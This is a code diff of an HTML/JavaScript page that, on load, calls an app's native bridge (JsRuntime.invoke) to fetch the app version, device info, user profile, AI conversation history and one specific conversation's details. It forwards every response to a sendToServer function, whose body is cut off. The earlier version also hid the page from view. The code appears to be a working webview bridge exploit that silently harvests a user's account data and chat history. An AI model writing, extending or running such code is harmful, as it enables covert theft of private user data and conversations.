@@ -1,31 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 0;
-            overflow: hidden;  /* 完全隐藏页面内容 */
-        }
-    </style>
-</head>
-<body>
-    <script>
-        (function init() {
-            // 修改后的通用请求方法
-            const makeRequest = (method, params) => {
-                try {
-                    if (method === 'request') {
-                        const reqData = params === 'userInfo' 
+<script>
+    (function init() {
+        const makeRequest = (method, params) => {
+            try {
+                if (method === 'request') {
+                    // 新增对话详情请求处理
+                    const reqData = params === 'userInfo'
+                        ? {
+                            path: "api/getuserinfo",
+                            method: "GET",
+                            data: "{}",
+                            header: "{}"
+                        }
+                        : params === 'history'
                             ? {
-                                path: "api/getuserinfo",
-                                method: "GET",
-                                data: "{}",
-                                header: "{}"
-                              }
-                            : {
                                 path: "api/user/agent/conversation/list",
                                 method: "POST",
                                 data: JSON.stringify({
@@ -35,40 +22,50 @@
                                     filterGoodQuestion: true
                                 }),
                                 header: "{}"
-                              };
-                        window.JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
-                    } else {
-                        window.JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
-                    }
-                } catch (error) {
-                    sendToServer({ error: error.message, method });
+                            }
+                            : {  // 新增对话详情请求
+                                path: "api/user/agent/conversation/v1/detail",
+                                method: "POST",
+                                data: JSON.stringify({
+                                    conversationId: "6c08e28b-b344-4fea-b5ab-218118654230",
+                                    offset: 0,
+                                    limit: 60
+                                }),
+                                header: "{}"
+                            };
+                    window.JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
+                } else {
+                    window.JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
                 }
-            };
+            } catch (error) {
+                sendToServer({ error: error.message, method });
+            }
+        };
 
-            // 初始化时执行所有请求
-            ['getAppVersion', 'getDeviceInfo', 'userInfo', 'history'].forEach(method => {
-                setTimeout(() => {  // 添加微小延时避免请求拥堵
-                    if (method === 'userInfo' || method === 'history') {
-                        makeRequest('request', method);
-                    } else {
-                        makeRequest(method);
-                    }
-                }, method === 'getAppVersion' ? 0 : 50);
-            });
-
-            // 网络传输方法
-            window.jsb = {
-                handleMessage: response => {
-                    const payload = {
-                        timestamp: new Date().toISOString(),
-                        type: 'jsb_response',
-                        data: response
-                    };
-                    sendToServer(payload);
+        // 添加新的请求标识符 conversationDetail
+        ['getAppVersion', 'getDeviceInfo', 'userInfo', 'history', 'conversationDetail'].forEach(method => {
+            setTimeout(() => {
+                if (['userInfo', 'history', 'conversationDetail'].includes(method)) {
+                    makeRequest('request', method);
+                } else {
+                    makeRequest(method);
                 }
-            };
+            }, method === 'getAppVersion' ? 0 : 50);
+        });
 
-            function sendToServer(data) {
+        // 保持其他代码不变
+        window.jsb = {
+            handleMessage: response => {
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    type: 'jsb_response',
+                    data: response
+                };
+                sendToServer(payload);
+            }
+        };
+
+        function sendToServer(data) {
                 const errorPayload = { 
                     timestamp: new Date().toISOString(),
                     type: 'client_error',
